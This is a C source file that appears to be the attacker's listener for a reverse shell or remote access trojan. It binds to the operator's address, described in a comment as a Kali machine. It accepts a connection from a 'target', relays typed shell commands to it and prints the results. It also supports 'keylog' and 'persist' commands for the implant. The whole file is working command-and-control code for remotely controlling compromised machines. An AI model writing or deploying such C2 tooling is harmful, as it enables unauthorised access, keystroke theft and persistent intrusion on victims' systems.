#include<stdio.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<arpa/inet.h>

int main(int argc, char* argv[]) {

        if(argc != 3)
                printf("Please provide the source IP and port used.");
        else {
                int sock;
                int clientSocket;

                char buffer[1024];
                char response[18384];

                struct sockaddr_in server_address, clientAddress;
                int i=0;
                int optval = 1;
                socklen_t client_length;

                sock = socket(AF_INET, SOCK_STREAM, 0); //0 means that we don't want other variables

                if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) { //this means that something is wrong with the connection
                        printf("Error Setting TCP Socket Options!\n");
                        return 1;
                }

                server_address.sin_family = AF_INET;
                server_address.sin_addr.s_addr = inet_addr(argv[1]); //the IP of my Kali machine

                server_address.sin_port = htons((unsigned short) strtoul(argv[2], NULL, 0));
                

                bind(sock, (struct sockaddr*) &server_address, sizeof(server_address));
                listen(sock, 5);

                client_length = sizeof(clientAddress);
                //accept the connection request:
                clientSocket = accept(sock, (struct sockaddr*)& clientAddress, &client_length);//we will use this variable to communicate to the target?

                while(1) {
                        jump:
                        bzero(&buffer, sizeof(buffer));
                        bzero(&response, sizeof(response));

                        printf("* shell#%s~$: ", inet_ntoa(clientAddress.sin_addr));
                        fgets(buffer, sizeof(buffer), stdin);

                        strtok(buffer, "\n"); //we sanitize the input, just in case the user sends "\n"
                        write(clientSocket, buffer, sizeof(buffer));

                        if(strncmp("quit", buffer, 4) ==0) {
                                break;
                        }
                        if(strncmp("cd ", buffer, 3) != 0 && strncmp("keylog", buffer, 6) != 0) {
                                if (strncmp("persist", buffer, 7) == 0) {
                                        recv(clientSocket, response, sizeof(response), 0);
                                        printf("%s", response);
                                }
                                else {
                                        recv(clientSocket, response, sizeof(response), MSG_WAITALL); //MSG_WAITALL waits for the entire operation to be done before doing other stuff
                                        printf("%s", response); //we are outputting the result of the command in the cmd
                                }
                        }
                }
        }
}
